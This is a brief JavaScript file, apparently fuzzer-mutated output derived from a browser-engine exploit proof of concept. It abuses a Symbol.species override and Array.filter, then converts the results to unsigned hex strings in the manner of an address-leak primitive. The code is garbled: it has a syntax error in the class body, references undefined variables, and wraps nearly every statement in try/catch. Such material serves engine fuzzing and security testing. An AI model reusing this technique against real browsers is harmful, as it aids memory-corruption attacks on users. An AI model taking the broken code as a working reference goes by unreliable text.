var o0 = new Array(0,2,3);
var o1 = new Array(1,2,o73);
try {
o40.slice;
}catch(o19){}
try {
o1.fill(7);
}catch(e){}
class o2{
  constructoro40.slice(o19,o19)
}

class o3 extends Array {
  // Overwrite species to the parent Array constructor
  static get [Symbol.species]() {

    //alert("get");
    try {
o4.o11 = o10[1];
}catch(e){}
    try {
return o2;
}catch(e){}
  }
}

var e = new Array({}, [], "natalie", 7, 7, 7, 7, 7);

try {
for(var o5 = 0; o5 < 0x200000; o5++) {
  try {
o8 = o786;
}catch(e){}
}
}catch(e){}

function test(name){
  try {
return true;
}catch(e){}
}

try {
o4.__proto__ = this;
}catch(e){}

var o6 = o4.filter(test);
//alert(o);
var o7 = [];

try {
for(o8 in o6){
  var o9 = new Number(o6[o8]);
  try {
if (o9 < 0){
    try {
o9 = o9 + 0x100000000;
}catch(e){}
  }
}catch(e){}
  try {
o7.push(o9.toString(16));
}catch(e){}
}
}catch(e){}
